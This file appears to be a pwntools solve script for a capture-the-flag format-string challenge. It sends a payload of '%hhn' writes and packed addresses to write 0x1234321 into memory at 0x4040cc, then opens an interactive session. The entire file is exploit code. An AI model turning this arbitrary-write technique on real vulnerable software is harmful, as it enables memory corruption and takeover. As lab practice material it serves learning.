from pwn import * 


# 0x1234321 

# 0x4040cc

binary = "./program"
p = process(binary)
#p = remote("chal.firebird.sh", 35041)
gdb.attach(p)


addr = 0x4040cc
payload = flat (
    # 0x1 0x23 0x43 0x21
    # from smallest to highest to prevent overflow
    # 0x1 0x21 0x23 0x43
    b'A%13$hhn', # 8 bytes
    b'%32c%14$hhn', # 11 bytes
    b'%2c%15$hhn', # 10 bytes
    b'%32c%16$hhn', # 11 bytes
    p64(addr+3),
    p64(addr),
    p64(addr+2),
    p64(addr+1),

    '''
    b'\xcf\x40\x40\x00\x00\x00\x00\x00',
    b'\xcc\x40\x40\x00\x00\x00\x00\x00',
    b'\xce\x40\x40\x00\x00\x00\x00\x00',
    b'\xcd\x40\x40\x00\x00\x00\x00\x00'
    '''
    
)

p.sendline(payload)

p.interactive()